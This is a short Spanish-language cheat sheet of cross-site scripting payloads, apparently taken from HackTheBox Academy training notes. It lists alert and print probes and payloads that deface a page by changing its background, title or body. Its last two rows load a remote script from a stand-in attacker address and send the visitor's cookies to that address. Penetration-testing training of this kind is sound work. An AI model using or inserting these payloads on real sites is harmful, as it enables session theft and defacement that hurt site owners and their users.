| Código                          | Descripción          |
|---------------------------------|----------------------|
| `<script>alert(window.origin)</script>` | Carga útil XSS básica |
| `<plaintext>` | Carga útil XSS básica |
| `<script>print()</script>` |  |
| `<img src="" onerror=alert(window.origin)>` | Carga útil XSS básica |
| `<script>document.body.style.background = "#141d2b"</script>` | Carga útil XSS basada en HTML |
| `<script>document.body.style.background = "#141d2b"</script` | Cambiar color de fondo |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Cambiar imagen de fondo  |
| `<script>document.title = 'HackTheBox Academy'</script>` | Cambiar título del sitio web  |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Sobrescribir el cuerpo principal del sitio web |
| `<script>document.getElementById('urlform').remove();</script>` | Eliminar cierto elemento HTML |
| `<script src="http://OUR_IP/script.js"></script>` | Cargar script remoto |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Envíenos los detalles de las cookies |